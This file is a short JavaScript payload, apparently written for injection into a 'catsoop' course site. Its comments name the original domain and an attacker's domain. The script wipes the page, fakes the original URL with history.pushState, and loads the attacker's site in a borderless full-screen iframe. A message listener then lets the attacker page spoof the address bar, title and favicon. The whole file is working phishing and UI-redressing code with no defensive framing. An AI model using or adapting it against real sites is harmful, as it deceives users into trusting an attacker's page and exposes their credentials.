// var ORIG_DOM = origianl catsoop domain
// var ATTACK_DOM = attacker's domain
document.getElementsByTagName('html')[0].innerHTML = ""
setTimeout(function() {history.pushState({},"URL",ORIG_DOM);}, 10);
document.head = document.head || document.getElementsByTagName('head')[0];

function changeFavicon(src) {
	var link = document.createElement('link'),
	oldLink = document.getElementById('dynamic-favicon');
	link.id = 'dynamic-favicon';
	link.rel = 'shortcut icon';
	link.href = src;
	if (oldLink) document.head.removeChild(oldLink);
	document.head.appendChild(link);
}

window.addEventListener("message", function(event) {
	if (event.data == "exit") {
		window.location = ORIG_DOM; 
	}
	else {
		url = event.data.url;
		favicon = event.data.icon;
		title = event.data.title;
		console.log("Setting icon: ", favicon);
		if (favicon != undefined && favicon != "")
			changeFavicon(favicon);
		if (url != undefined && url != "")
			history.pushState({},"URL",url);
		if (title != undefined && title != "")
			document.title = title;
	}
}, false);
function injectHTML(page) {
	var s = "<iframe frameborder='0' seamless='seamless' style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' src='" + page + "'>";
	document.getElementsByTagName("html")[0].innerHTML = s;
	document.getElementsByTagName("html")[0].style.display = "block";
}
injectHTML(ATTACK_DOM)
